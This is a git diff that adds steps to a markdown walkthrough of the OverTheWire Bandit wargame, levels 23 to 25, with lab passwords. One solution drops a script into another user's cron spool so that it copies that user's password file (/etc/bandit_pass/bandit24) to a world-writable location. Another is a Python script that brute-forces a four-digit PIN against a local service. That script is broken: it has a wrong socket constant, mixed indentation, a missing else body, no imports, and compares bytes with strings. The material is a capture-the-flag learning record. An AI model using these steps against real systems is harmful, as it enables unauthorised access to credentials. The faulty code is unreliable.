@@ -368,4 +368,73 @@ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
-got password:jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+got password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+## level 23 -> level 24
+
+**solution**
+
+```
+ssh bandit.labs.overthewire.org -p 2220 -l bandit23
+cd /etc/cron.d
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/level23
+cd /tmp/level23
+touch connect.sh
+chmod 777 connect.sh
+vim connect.sh
+```
+
+In vim put this line into the code
+```
+cat /etc/bandit_pass/bandit24 > /tmp/level23/password
+```
+
+Then
+
+```
+touch password
+chmod 666 password
+cp connect.sh /var/spool/bandit24
+```
+
+got password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+## level 24 -> level 25
+
+**solution**
+
+```
+ssh bandit.labs.overthewire.org -p 2220 -l bandit24
+mkdir /tmp/secttp
+touch pincode.py
+vim pincode.py
+```
+
+Input the following code
+
+```
+pincode = 0   
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"          
+try:
+	s = socket.socket(socket.AF_INT, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1", 30002))
+                
+	while pincode < 10000:                       
+        pincodeString = str(pincode).zfill(4)                 
+        message = password + " " + pincodeString + "\n"
+               
+        s.sendall(message.encode())
+        resp = s.recv(1024)    
+        if "Wrong" not in resp:
+            print(resp)                                                     
+            break
+        else:
+        print(str(pincode))
+        pincode += 1
+               
+finally:      
+	sys.exit(0)
+```
+got password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
